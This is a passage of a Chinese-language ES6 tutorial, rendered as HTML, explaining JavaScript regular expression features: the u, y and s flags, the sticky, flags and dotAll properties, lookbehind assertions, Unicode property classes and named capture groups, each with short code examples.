<p>一旦加上<code>u</code>修饰符号，就会修改下面这些正则表达式的行为。</p>
<h5 id="（1）点字符"><a href="#（1）点字符" class="headerlink" title="（1）点字符"></a>（1）点字符</h5><p>点（<code>.</code>）字符在正则表达式中，含义是除了换行符以外的任意单个字符。对于码点大于<code>0xFFFF</code>的 Unicode 字符，点字符不能识别，必须加上<code>u</code>修饰符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;𠮷&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/^.$/.test(s) <span class="comment">// false</span></span><br><span class="line">/^.$/u.test(s) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，如果不添加<code>u</code>修饰符，正则表达式就会认为字符串为两个字符，从而匹配失败。</p>
<h5 id="（2）Unicode-字符表示法"><a href="#（2）Unicode-字符表示法" class="headerlink" title="（2）Unicode 字符表示法"></a>（2）Unicode 字符表示法</h5><p>ES6 新增了使用大括号表示 Unicode 字符，这种表示法在正则表达式中必须加上<code>u</code>修饰符，才能识别当中的大括号，否则会被解读为量词。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/\u&#123;<span class="number">61</span>&#125;/.test(<span class="string">&#x27;a&#x27;</span>) <span class="comment">// false</span></span><br><span class="line">/\u&#123;<span class="number">61</span>&#125;/u.test(<span class="string">&#x27;a&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/\u&#123;20BB7&#125;/u.test(<span class="string">&#x27;𠮷&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，如果不加<code>u</code>修饰符，正则表达式无法识别<code>\u&#123;61&#125;</code>这种表示法，只会认为这匹配 61 个连续的<code>u</code>。</p>
<h5 id="（3）量词"><a href="#（3）量词" class="headerlink" title="（3）量词"></a>（3）量词</h5><p>使用<code>u</code>修饰符后，所有量词都会正确识别码点大于<code>0xFFFF</code>的 Unicode 字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a&#123;<span class="number">2</span>&#125;/.test(<span class="string">&#x27;aa&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/a&#123;<span class="number">2</span>&#125;/u.test(<span class="string">&#x27;aa&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/𠮷&#123;<span class="number">2</span>&#125;/.test(<span class="string">&#x27;𠮷𠮷&#x27;</span>) <span class="comment">// false</span></span><br><span class="line">/𠮷&#123;<span class="number">2</span>&#125;/u.test(<span class="string">&#x27;𠮷𠮷&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h5 id="（4）预定义模式"><a href="#（4）预定义模式" class="headerlink" title="（4）预定义模式"></a>（4）预定义模式</h5><p><code>u</code>修饰符也影响到预定义模式，能否正确识别码点大于<code>0xFFFF</code>的 Unicode 字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/^\S$/.test(<span class="string">&#x27;𠮷&#x27;</span>) <span class="comment">// false</span></span><br><span class="line">/^\S$/u.test(<span class="string">&#x27;𠮷&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码的<code>\S</code>是预定义模式，匹配所有非空白字符。只有加了<code>u</code>修饰符，它才能正确匹配码点大于<code>0xFFFF</code>的 Unicode 字符。</p>
<p>利用这一点，可以写出一个正确返回字符串长度的函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">codePointLength</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = text.match(<span class="regexp">/[\s\S]/gu</span>);</span><br><span class="line">  <span class="keyword">return</span> result ? result.length : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;𠮷𠮷&#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.length <span class="comment">// 4</span></span><br><span class="line">codePointLength(s) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h5 id="（5）i-修饰符"><a href="#（5）i-修饰符" class="headerlink" title="（5）i 修饰符"></a>（5）i 修饰符</h5><p>有些 Unicode 字符的编码不同，但是字型很相近，比如，<code>\u004B</code>与<code>\u212A</code>都是大写的<code>K</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[a-z]/i.test(<span class="string">&#x27;\u212A&#x27;</span>) <span class="comment">// false</span></span><br><span class="line">/[a-z]/iu.test(<span class="string">&#x27;\u212A&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，不加<code>u</code>修饰符，就无法识别非规范的<code>K</code>字符。</p>
<h5 id="（6）转义"><a href="#（6）转义" class="headerlink" title="（6）转义"></a>（6）转义</h5><p>没有<code>u</code>修饰符的情况下，正则中没有定义的转义（如逗号的转义<code>\</code>,）无效，而在<code>u</code>模式会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/\,<span class="regexp">/ /</span><span class="regexp">/ /</span>\,/</span><br><span class="line">/\,<span class="regexp">/u /</span><span class="regexp">/ 报错</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，没有<code>u</code>修饰符时，逗号前面的反斜杠是无效的，加了<code>u</code>修饰符就报错。</p>
<h4 id="6-4-RegExp-prototype-unicode-属性"><a href="#6-4-RegExp-prototype-unicode-属性" class="headerlink" title="6.4 RegExp.prototype.unicode 属性"></a>6.4 RegExp.prototype.unicode 属性</h4><p>正则实例对象新增<code>unicode</code>属性，表示是否设置了<code>u</code>修饰符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> r1 = <span class="regexp">/hello/</span>;</span><br><span class="line"><span class="keyword">const</span> r2 = <span class="regexp">/hello/u</span>;</span><br><span class="line"></span><br><span class="line">r1.unicode <span class="comment">// false</span></span><br><span class="line">r2.unicode <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，正则表达式是否设置了<code>u</code>修饰符，可以从<code>unicode</code>属性看出来。</p>
<h4 id="6-5-y-修饰符"><a href="#6-5-y-修饰符" class="headerlink" title="6.5 y 修饰符"></a>6.5 y 修饰符</h4><p>除了<code>u</code>修饰符，ES6 还为正则表达式添加了<code>y</code>修饰符，叫做“粘连”（sticky）修饰符。</p>
<p><code>y</code>修饰符的作用与<code>g</code>修饰符类似，也是全局匹配，后一次匹配都从上一次匹配成功的下一个位置开始。不同之处在于，<code>g</code>修饰符只要剩余位置中存在匹配就可，而<code>y</code>修饰符确保匹配必须从剩余的第一个位置开始，这也就是“粘连”的涵义。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;aaa_aa_a&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> r1 = <span class="regexp">/a+/g</span>;</span><br><span class="line"><span class="keyword">var</span> r2 = <span class="regexp">/a+/y</span>;</span><br><span class="line"></span><br><span class="line">r1.exec(s) <span class="comment">// [&quot;aaa&quot;]</span></span><br><span class="line">r2.exec(s) <span class="comment">// [&quot;aaa&quot;]</span></span><br><span class="line"></span><br><span class="line">r1.exec(s) <span class="comment">// [&quot;aa&quot;]</span></span><br><span class="line">r2.exec(s) <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>上面代码有两个正则表达式，一个使用<code>g</code>修饰符，另一个使用<code>y</code>修饰符。这两个正则表达式各执行了两次，第一次执行的时候，两者行为相同，剩余字符串都是<code>_aa_a</code>。由于<code>g</code>修饰没有位置要求，所以第二次执行会返回结果，而<code>y</code>修饰符要求匹配必须从头部开始，所以返回<code>null</code>。</p>
<p>如果改一下正则表达式，保证每次都能头部匹配，<code>y</code>修饰符就会返回结果了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;aaa_aa_a&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> r = <span class="regexp">/a+_/y</span>;</span><br><span class="line"></span><br><span class="line">r.exec(s) <span class="comment">// [&quot;aaa_&quot;]</span></span><br><span class="line">r.exec(s) <span class="comment">// [&quot;aa_&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码每次匹配，都是从剩余字符串的头部开始。</p>
<p>使用<code>lastIndex</code>属性，可以更好地说明<code>y</code>修饰符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> REGEX = <span class="regexp">/a/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定从2号位置（y）开始匹配</span></span><br><span class="line">REGEX.lastIndex = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配成功</span></span><br><span class="line"><span class="keyword">const</span> match = REGEX.exec(<span class="string">&#x27;xaya&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在3号位置匹配成功</span></span><br><span class="line">match.index <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下一次匹配从4号位开始</span></span><br><span class="line">REGEX.lastIndex <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4号位开始匹配失败</span></span><br><span class="line">REGEX.exec(<span class="string">&#x27;xaya&#x27;</span>) <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>lastIndex</code>属性指定每次搜索的开始位置，<code>g</code>修饰符从这个位置开始向后搜索，直到发现匹配为止。</p>
<p><code>y</code>修饰符同样遵守<code>lastIndex</code>属性，但是要求必须在<code>lastIndex</code>指定的位置发现匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> REGEX = <span class="regexp">/a/y</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定从2号位置开始匹配</span></span><br><span class="line">REGEX.lastIndex = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不是粘连，匹配失败</span></span><br><span class="line">REGEX.exec(<span class="string">&#x27;xaya&#x27;</span>) <span class="comment">// null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定从3号位置开始匹配</span></span><br><span class="line">REGEX.lastIndex = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3号位置是粘连，匹配成功</span></span><br><span class="line"><span class="keyword">const</span> match = REGEX.exec(<span class="string">&#x27;xaya&#x27;</span>);</span><br><span class="line">match.index <span class="comment">// 3</span></span><br><span class="line">REGEX.lastIndex <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>
<p>实际上，<code>y</code>修饰符号隐含了头部匹配的标志<code>^</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/b/y.exec(<span class="string">&#x27;aba&#x27;</span>)</span><br><span class="line"><span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>上面代码由于不能保证头部匹配，所以返回<code>null</code>。<code>y</code>修饰符的设计本意，就是让头部匹配的标志<code>^</code>在全局匹配中都有效。</p>
<p>下面是字符串对象的<code>replace</code>方法的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> REGEX = <span class="regexp">/a/gy</span>;</span><br><span class="line"><span class="string">&#x27;aaxa&#x27;</span>.replace(REGEX, <span class="string">&#x27;-&#x27;</span>) <span class="comment">// &#x27;--xa&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，最后一个<code>a</code>因为不是出现在下一次匹配的头部，所以不会被替换。</p>
<p>单单一个<code>y</code>修饰符对<code>match</code>方法，只能返回第一个匹配，必须与<code>g</code>修饰符联用，才能返回所有匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a1a2a3&#x27;</span>.match(<span class="regexp">/a\d/y</span>) <span class="comment">// [&quot;a1&quot;]</span></span><br><span class="line"><span class="string">&#x27;a1a2a3&#x27;</span>.match(<span class="regexp">/a\d/gy</span>) <span class="comment">// [&quot;a1&quot;, &quot;a2&quot;, &quot;a3&quot;]</span></span><br></pre></td></tr></table></figure>
<p><code>y</code>修饰符的一个应用，是从字符串提取 token（词元），<code>y</code>修饰符确保了匹配之间不会有漏掉的字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> TOKEN_Y = <span class="regexp">/\s*(\+|[0-9]+)\s*/y</span>;</span><br><span class="line"><span class="keyword">const</span> TOKEN_G  = <span class="regexp">/\s*(\+|[0-9]+)\s*/g</span>;</span><br><span class="line"></span><br><span class="line">tokenize(TOKEN_Y, <span class="string">&#x27;3 + 4&#x27;</span>)</span><br><span class="line"><span class="comment">// [ &#x27;3&#x27;, &#x27;+&#x27;, &#x27;4&#x27; ]</span></span><br><span class="line">tokenize(TOKEN_G, <span class="string">&#x27;3 + 4&#x27;</span>)</span><br><span class="line"><span class="comment">// [ &#x27;3&#x27;, &#x27;+&#x27;, &#x27;4&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tokenize</span>(<span class="params">TOKEN_REGEX, str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">let</span> match;</span><br><span class="line">  <span class="keyword">while</span> (match = TOKEN_REGEX.exec(str)) &#123;</span><br><span class="line">    result.push(match[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，如果字符串里面没有非法字符，<code>y</code>修饰符与<code>g</code>修饰符的提取结果是一样的。但是，一旦出现非法字符，两者的行为就不一样了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tokenize(TOKEN_Y, <span class="string">&#x27;3x + 4&#x27;</span>)</span><br><span class="line"><span class="comment">// [ &#x27;3&#x27; ]</span></span><br><span class="line">tokenize(TOKEN_G, <span class="string">&#x27;3x + 4&#x27;</span>)</span><br><span class="line"><span class="comment">// [ &#x27;3&#x27;, &#x27;+&#x27;, &#x27;4&#x27; ]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>g</code>修饰符会忽略非法字符，而<code>y</code>修饰符不会，这样就很容易发现错误。</p>
<h4 id="6-7-RegExp-prototype-sticky-属性"><a href="#6-7-RegExp-prototype-sticky-属性" class="headerlink" title="6.7 RegExp.prototype.sticky 属性"></a>6.7 RegExp.prototype.sticky 属性</h4><p>与<code>y</code>修饰符相匹配，ES6 的正则实例对象多了<code>sticky</code>属性，表示是否设置了<code>y</code>修饰符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="regexp">/hello\d/y</span>;</span><br><span class="line">r.sticky <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h4 id="6-8-RegExp-prototype-flags-属性"><a href="#6-8-RegExp-prototype-flags-属性" class="headerlink" title="6.8 RegExp.prototype.flags 属性"></a>6.8 RegExp.prototype.flags 属性</h4><p>ES6 为正则表达式新增了<code>flags</code>属性，会返回正则表达式的修饰符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5 的 source 属性</span></span><br><span class="line"><span class="comment">// 返回正则表达式的正文</span></span><br><span class="line">/abc/ig.source</span><br><span class="line"><span class="comment">// &quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 的 flags 属性</span></span><br><span class="line"><span class="comment">// 返回正则表达式的修饰符</span></span><br><span class="line">/abc/ig.flags</span><br><span class="line"><span class="comment">// &#x27;gi&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="6-9-s-修饰符：dotAll-模式"><a href="#6-9-s-修饰符：dotAll-模式" class="headerlink" title="6.9 s 修饰符：dotAll 模式"></a>6.9 s 修饰符：dotAll 模式</h4><p>正则表达式中，点（<code>.</code>）是一个特殊字符，代表任意的单个字符，但是有两个例外。一个是四个字节的 UTF-16 字符，这个可以用<code>u</code>修饰符解决；另一个是行终止符（line terminator character）。</p>
<p>所谓行终止符，就是该字符表示一行的终结。以下四个字符属于“行终止符”。</p>
<p>U+000A 换行符（<code>\n</code>）<br>U+000D 回车符（<code>\r</code>）<br>U+2028 行分隔符（line separator）<br>U+2029 段分隔符（paragraph separator）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/foo.bar/.test(<span class="string">&#x27;foo\nbar&#x27;</span>)</span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，因为.不匹配<code>\n</code>，所以正则表达式返回<code>false</code>。</p>
<p>但是，很多时候我们希望匹配的是任意单个字符，这时有一种变通的写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/foo[^]bar/.test(<span class="string">&#x27;foo\nbar&#x27;</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>这种解决方案毕竟不太符合直觉，ES2018 引入<code>s</code>修饰符，使得<code>.</code>可以匹配任意单个字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/foo.bar/s.test(<span class="string">&#x27;foo\nbar&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>这被称为<code>dotAll</code>模式，即点（dot）代表一切字符。所以，正则表达式还引入了一个<code>dotAll</code>属性，返回一个布尔值，表示该正则表达式是否处在<code>dotAll</code>模式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> re = <span class="regexp">/foo.bar/</span>s;</span><br><span class="line"><span class="comment">// 另一种写法</span></span><br><span class="line"><span class="comment">// const re = new RegExp(&#x27;foo.bar&#x27;, &#x27;s&#x27;);</span></span><br><span class="line"></span><br><span class="line">re.test(<span class="string">&#x27;foo\nbar&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">re.dotAll <span class="comment">// true</span></span><br><span class="line">re.flags <span class="comment">// &#x27;s&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>/s</code>修饰符和多行修饰符<code>/m</code>不冲突，两者一起使用的情况下，<code>.</code>匹配所有字符，而<code>^</code>和<code>$</code>匹配每一行的行首和行尾。</p>
<h4 id="6-10-后行断言"><a href="#6-10-后行断言" class="headerlink" title="6.10 后行断言"></a>6.10 后行断言</h4><p>JavaScript 语言的正则表达式，只支持先行断言（lookahead）和先行否定断言（negative lookahead），不支持后行断言（lookbehind）和后行否定断言（negative lookbehind）。ES2018 引入后行断言，V8 引擎 4.9 版（Chrome 62）已经支持。</p>
<p>“先行断言”指的是，<code>x</code>只有在<code>y</code>前面才匹配，必须写成<code>/x(?=y)/</code>。比如，只匹配百分号之前的数字，要写成<code>/\d+(?=%)/</code>。“先行否定断言”指的是，<code>x</code>只有不在<code>y</code>前面才匹配，必须写成<code>/x(?!y)/</code>。比如，只匹配不在百分号之前的数字，要写成<code>/\d+(?!%)/</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/\d+(?=%)/.exec(<span class="string">&#x27;100% of US presidents have been male&#x27;</span>)  <span class="comment">// [&quot;100&quot;]</span></span><br><span class="line">/\d+(?!%)/.exec(<span class="string">&#x27;that’s all 44 of them&#x27;</span>)                 <span class="comment">// [&quot;44&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面两个字符串，如果互换正则表达式，就不会得到相同结果。另外，还可以看到，“先行断言”括号之中的部分（<code>(?=%)</code>），是不计入返回结果的。</p>
<p>“后行断言”正好与“先行断言”相反，<code>x</code>只有在<code>y</code>后面才匹配，必须写成<code>/(?&lt;=y)x/</code>。比如，只匹配美元符号之后的数字，要写成<code>/(?&lt;=\$)\d+/</code>。“后行否定断言”则与“先行否定断言”相反，<code>x</code>只有不在<code>y</code>后面才匹配，必须写成<code>/(?&lt;!y)x/</code>。比如，只匹配不在美元符号后面的数字，要写成<code>/(?&lt;!\$)\d+/</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/(?&lt;=\$)\d+<span class="regexp">/.exec(&#x27;Benjamin Franklin is on the $100 bill&#x27;)  /</span><span class="regexp">/ [&quot;100&quot;]</span></span><br><span class="line"><span class="regexp">/</span>(?&lt;!\$)\d+<span class="regexp">/.exec(&#x27;it’s is worth about €90&#x27;)                /</span><span class="regexp">/ [&quot;90&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面的例子中，“后行断言”的括号之中的部分（<code>(?&lt;=\$)</code>），也是不计入返回结果。</p>
<p>下面的例子是使用后行断言进行字符串替换。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_DOLLAR_PREFIX = <span class="regexp">/(?&lt;=\$)foo/g</span>;</span><br><span class="line"><span class="string">&#x27;$foo %foo foo&#x27;</span>.replace(RE_DOLLAR_PREFIX, <span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line"><span class="comment">// &#x27;$bar %foo foo&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，只有在美元符号后面的<code>foo</code>才会被替换。</p>
<p>“后行断言”的实现，需要先匹配<code>/(?&lt;=y)x/</code>的<code>x</code>，然后再回到左边，匹配<code>y</code>的部分。这种“先右后左”的执行顺序，与所有其他正则操作相反，导致了一些不符合预期的行为。</p>
<p>首先，后行断言的组匹配，与正常情况下结果是不一样的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/(?&lt;=(\d+)(\d+))$/.exec(<span class="string">&#x27;1053&#x27;</span>) <span class="comment">// [&quot;&quot;, &quot;1&quot;, &quot;053&quot;]</span></span><br><span class="line">/^(\d+)(\d+)$/.exec(<span class="string">&#x27;1053&#x27;</span>) <span class="comment">// [&quot;1053&quot;, &quot;105&quot;, &quot;3&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，需要捕捉两个组匹配。没有“后行断言”时，第一个括号是贪婪模式，第二个括号只能捕获一个字符，所以结果是<code>105</code>和<code>3</code>。而“后行断言”时，由于执行顺序是从右到左，第二个括号是贪婪模式，第一个括号只能捕获一个字符，所以结果是<code>1</code>和<code>053</code>。</p>
<p>其次，“后行断言”的反斜杠引用，也与通常的顺序相反，必须放在对应的那个括号之前。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/(?&lt;=(o)d\<span class="number">1</span>)r/.exec(<span class="string">&#x27;hodor&#x27;</span>)  <span class="comment">// null</span></span><br><span class="line">/(?&lt;=\1d(o))r/.exec(<span class="string">&#x27;hodor&#x27;</span>)  <span class="comment">// [&quot;r&quot;, &quot;o&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，如果后行断言的反斜杠引用（<code>\1</code>）放在括号的后面，就不会得到匹配结果，必须放在前面才可以。因为后行断言是先从左到右扫描，发现匹配以后再回过头，从右到左完成反斜杠引用。</p>
<h4 id="3-11-Unicode-属性类"><a href="#3-11-Unicode-属性类" class="headerlink" title="3.11 Unicode 属性类"></a>3.11 Unicode 属性类</h4><p>ES2018 引入了一种新的类的写法<code>\p&#123;...&#125;</code>和<code>\P&#123;...&#125;</code>，允许正则表达式匹配符合 Unicode 某种属性的所有字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> regexGreekSymbol = <span class="regexp">/\p&#123;Script=Greek&#125;/u</span>;</span><br><span class="line">regexGreekSymbol.test(<span class="string">&#x27;π&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>\p&#123;Script=Greek&#125;</code>指定匹配一个希腊文字母，所以匹配<code>π</code>成功。</p>
<p>Unicode 属性类要指定属性名和属性值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">\p&#123;UnicodePropertyName=UnicodePropertyValue&#125;</span><br></pre></td></tr></table></figure>
<p>对于某些属性，可以只写属性名，或者只写属性值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">\p&#123;UnicodePropertyName&#125;</span><br><span class="line">\p&#123;UnicodePropertyValue&#125;</span><br></pre></td></tr></table></figure>
<p><code>\P&#123;…&#125;</code>是<code>\p&#123;…&#125;</code>的反向匹配，即匹配不满足条件的字符。</p>
<p>注意，这两种类只对 Unicode 有效，所以使用的时候一定要加上<code>u</code>修饰符。如果不加<code>u</code>修饰符，正则表达式使用<code>\p</code>和<code>\P</code>会报错，ECMAScript 预留了这两个类。</p>
<p>由于 Unicode 的各种属性非常多，所以这种新的类的表达能力非常强。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> regex = <span class="regexp">/^\p&#123;Decimal_Number&#125;+$/u</span>;</span><br><span class="line">regex.test(<span class="string">&#x27;𝟏𝟐𝟑𝟜𝟝𝟞𝟩𝟪𝟫𝟬𝟭𝟮𝟯𝟺𝟻𝟼&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，属性类指定匹配所有十进制字符，可以看到各种字型的十进制字符都会匹配成功。</p>
<p><code>\p&#123;Number&#125;</code>甚至能匹配罗马数字。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 匹配所有数字</span></span><br><span class="line"><span class="keyword">const</span> regex = <span class="regexp">/^\p&#123;Number&#125;+$/u</span>;</span><br><span class="line">regex.test(<span class="string">&#x27;²³¹¼½¾&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">regex.test(<span class="string">&#x27;㉛㉜㉝&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">regex.test(<span class="string">&#x27;ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫ&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>下面是其他一些例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 匹配所有空格</span></span><br><span class="line">\p&#123;White_Space&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配各种文字的所有字母，等同于 Unicode 版的 \w</span></span><br><span class="line">[\p&#123;Alphabetic&#125;\p&#123;Mark&#125;\p&#123;Decimal_Number&#125;\p&#123;Connector_Punctuation&#125;\p&#123;Join_Control&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配各种文字的所有非字母的字符，等同于 Unicode 版的 \W</span></span><br><span class="line">[^\p&#123;Alphabetic&#125;\p&#123;Mark&#125;\p&#123;Decimal_Number&#125;\p&#123;Connector_Punctuation&#125;\p&#123;Join_Control&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配 Emoji</span></span><br><span class="line">/\p&#123;Emoji_Modifier_Base&#125;\p&#123;Emoji_Modifier&#125;?|\p&#123;Emoji_Presentation&#125;|\p&#123;Emoji&#125;\uFE0F/gu</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配所有的箭头字符</span></span><br><span class="line"><span class="keyword">const</span> regexArrows = <span class="regexp">/^\p&#123;Block=Arrows&#125;+$/u</span>;</span><br><span class="line">regexArrows.test(<span class="string">&#x27;←↑→↓↔↕↖↗↘↙⇏⇐⇑⇒⇓⇔⇕⇖⇗⇘⇙⇧⇩&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h4 id="6-12-具名组匹配"><a href="#6-12-具名组匹配" class="headerlink" title="6.12 具名组匹配"></a>6.12 具名组匹配</h4><h5 id="6-12-1-简介"><a href="#6-12-1-简介" class="headerlink" title="6.12.1 简介"></a>6.12.1 简介</h5><p>正则表达式使用圆括号进行组匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_DATE = <span class="regexp">/(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，正则表达式里面有三组圆括号。使用<code>exec</code>方法，就可以将这三组匹配结果提取出来。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_DATE = <span class="regexp">/(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> matchObj = RE_DATE.exec(<span class="string">&#x27;1999-12-31&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> year = matchObj[<span class="number">1</span>]; <span class="comment">// 1999</span></span><br><span class="line"><span class="keyword">const</span> month = matchObj[<span class="number">2</span>]; <span class="comment">// 12</span></span><br><span class="line"><span class="keyword">const</span> day = matchObj[<span class="number">3</span>]; <span class="comment">// 31</span></span><br></pre></td></tr></table></figure>
<p>组匹配的一个问题是，每一组的匹配含义不容易看出来，而且只能用数字序号（比如<code>matchObj[1]</code>）引用，要是组的顺序变了，引用的时候就必须修改序号。</p>
<p>ES2018 引入了具名组匹配（Named Capture Groups），允许为每一个组匹配指定一个名字，既便于阅读代码，又便于引用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_DATE = <span class="regexp">/(?&lt;year&gt;\d&#123;4&#125;)-(?&lt;month&gt;\d&#123;2&#125;)-(?&lt;day&gt;\d&#123;2&#125;)/</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> matchObj = RE_DATE.exec(<span class="string">&#x27;1999-12-31&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> year = matchObj.groups.year; <span class="comment">// &quot;1999&quot;</span></span><br><span class="line"><span class="keyword">const</span> month = matchObj.groups.month; <span class="comment">// &quot;12&quot;</span></span><br><span class="line"><span class="keyword">const</span> day = matchObj.groups.day; <span class="comment">// &quot;31&quot;</span></span><br></pre></td></tr></table></figure>
